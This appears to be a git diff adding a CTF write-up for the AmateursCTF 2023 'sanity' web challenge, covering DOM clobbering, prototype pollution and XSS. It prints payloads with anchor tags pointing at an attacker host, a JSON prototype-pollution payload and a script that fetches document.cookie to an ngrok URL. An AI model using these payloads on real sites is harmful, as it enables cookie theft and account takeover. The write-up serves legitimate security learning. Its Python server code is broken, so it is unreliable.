@@ -1,12 +1,19 @@
 ---
 title: Web Sanity Writeup AmateursCTF 2023 DOM Clobbering and Prototype Pollution
+tags:
+  - amateurs-ctf
+  - writeup
+  - sanity
+  - xss
+  - dom-clobbering
+  - prototype-pollution
 categories:
   - CTF
   - Writeups
 summary: A complete writeup of sanity web challenge from AmateursCTF 2023. It covers the use of the Sanitizer API in browsers, DOM Clobbering, Parameter Pollution and XSS.  
 created: 2023-07-21
 lastmod: 2023-07-21
-image: https://github.com/hash3liZer/khatta/assets/29171692/755e47ec-8f67-45e9-a7cb-04efe7584127
+image: https://github.com/hash3liZer/khatta/assets/29171692/c70a5dc7-5294-45b7-8a9f-8a04ac9214b3
 ---
 
 ## Introduction
@@ -145,8 +152,100 @@ The class parameter initialized is a private member. The problem here is i can't
 The milestone is to initialize a `debug` parameter on browser windows object. 
 
 With DOM Clobbering, if we give `id` to an element, the element is then initialized on browser's `window` object. I started with a simple `div` tag in the `Name Your Rant` field: 
+```html
+<div id="debug"></div>
 ```
-<div id="debug"></debug>
+![image](https://github.com/hash3liZer/khatta/assets/29171692/6362e084-0a44-493c-9c0a-a6f9878f3283)
+
+Good enough, we got the html element. But now how to get the `extension` property on this element. I almost spend hours searching for this. Anyways, the following payload seems to give the html element as the string:
+```html
+<div id="debug"></div><div id="debug" name="extension" href="http://payload.shameerkashif.me"></div>
 ```
 
+If we are to use the `anchor` tag instead of `div` tag, we will get the URL in return. So, our first part would look like: 
+```
+<a id="debug"></a><a id="debug" name="extension" href="http://payload.shameerkashif.me"></a>
+```
 
+![image](https://github.com/hash3liZer/khatta/assets/29171692/d1df6d24-3879-437a-b167-00d66f6c7345)
+
+### Attacker Server
+Here's the code that i generated using `bard`:
+```python
+import http.server
+import json
+
+def handle_request(request):
+    response = {"message": "Hello, world!"}
+    response_headers = {"Access-Control-Allow-Origin": "*"}
+    return http.server.SimpleHTTPRequestHandler._set_headers(
+        request, response, response_headers
+    )
+
+server = http.server.HTTPServer(('', 8000), handle_request)
+server.serve_forever()
+
+```
+
+Run the code and proxy it through ngrok:
+```
+python3 server.py
+ngrok http 8000
+```
+
+### Prototype Pollution
+With having control of the `extension` variable, lets try to do parameter pollution at this point. The most basic payload that came to my mind: 
+```javascript
+{
+  "__proto__": {
+    "sanitize": false,
+    "report": true
+  }
+}
+```
+
+But as assumed very earlier, this gave me error as i can't override the private member of Debug class. Well, the default value should be undefined when none provided for `get` function. Because, you see the simple sanitize resolves to the `get` function of the `Debug`. Since, we are overriding the prototype, we should leave it like this: 
+```javascript
+{
+  "__proto__": {
+    "report": true
+  }
+}
+```
+
+![image](https://github.com/hash3liZer/khatta/assets/29171692/8128f783-7c66-479d-8b10-39989c5346a2)
+
+And we got to this point as well. 
+
+#### Proof of Concept (POC)
+Lets craft our final PoC. In the `name your rant` field we have: 
+```html
+<a id="debug"></a><a id="debug" name="extension" href="http://payload.shameerkashif.me"></a>
+```
+
+And for our server, we would give the following payload:
+```python
+import http.server
+import json
+
+def handle_request(request):
+    response = {
+      "__proto__": {
+        "report": true
+      }
+    }
+    response_headers = {"Access-Control-Allow-Origin": "*"}
+    return http.server.SimpleHTTPRequestHandler._set_headers(
+        request, response, response_headers
+    )
+
+server = http.server.HTTPServer(('', 8000), handle_request)
+server.serve_forever()
+```
+
+And finally in the paste section, lets put our final payload to steal the cookie: 
+```html
+<script>fetch("http://ngrokurl/" + document.cookie)</script>
+```
+
+And we get the flag in the server url. As said i wasn't able to solve the challenge within due time as i got stuck with anchor tag issue. But neverthless, this was a fun challenge and was worth exploring. 
